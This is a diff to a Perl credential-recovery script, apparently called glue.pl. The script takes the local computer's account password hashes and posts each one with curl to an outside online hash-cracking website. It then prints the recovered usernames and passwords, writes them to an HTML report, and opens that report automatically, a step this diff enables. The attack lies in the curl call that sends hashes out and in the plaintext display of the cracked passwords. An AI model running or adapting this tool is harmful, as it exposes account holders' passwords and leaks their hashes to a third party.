@@ -61,7 +61,9 @@ sub rainbow {
 
 	my $command = "curl -d \"hashToSearch=$hash&searchHash=Search\" http://www.onlinehashcrack.com/free-hash-reverse.php 2>&1";
 
-	sleep 1; # prevent DoS
+	my $delay = 2; # sec
+	sleep $delay; # prevent DoS
+
 	my $output = qx($command);
 
 	if ($output =~ m/letter\-spacing:1\.2px">(.*)<\/b><br \/>/) {
@@ -96,6 +98,7 @@ sub record {
 <body>
 <center>
 <h1>Accounts on this computer</h1>
+<h4><a href="https://github.com/mcandre/glue">glue.pl</a></h4>
 END
 
 	my $end_content = <<END;
@@ -109,7 +112,10 @@ END
 	print WEBPAGE $begin_content;
 
 	while (my ($username, $password) = each(%$decrypted_accounts)) {
-		print WEBPAGE "<h3>$username / $password</h3>";
+		my $account = "<h3>$username / <span class=\"password\">$password</span></h3>";
+		$account = "<h3>$username</h3>" if $password eq "";
+
+		print WEBPAGE $account;
 	}
 
 	print WEBPAGE $end_content;
@@ -118,14 +124,14 @@ END
 }
 
 sub show {
-	my ($ip, $decrypted_accounts, $url) = @_;
+	my ($ip, $decrypted_accounts, $webpage) = @_;
 
 	my $o = os;
 	my $binary = "open";
 	$binary = "start" if $o eq "Windows";
 
-	my $command = "$binary $url";
-	#system $command;
+	my $command = "$binary $webpage";
+	system $command;
 }
 
 sub main {
@@ -134,16 +140,20 @@ sub main {
 	my $encrypted_accounts = dump_accounts;
 	my $decrypted_accounts = {};
 
+	print "Accounts on this computer\n";
+
 	while (my ($username, $hash) = each(%$encrypted_accounts)) {
 		my $password = rainbow $hash;
 		$decrypted_accounts->{$username} = $password;
+
+		print "\nUsername: $username\n";
+		print "Password: $password\n" unless $password eq "";
 	}
 
-	my $webpage = getcwd . "/report.html";
-	my $url = "file://$webpage";
+	my $webpage = "report.html";
 
 	record($ip, $decrypted_accounts, $webpage);
-	show($ip, $decrypted_accounts, $url);
+	show($ip, $decrypted_accounts, $webpage);
 }
 
 unless(caller) { main; }
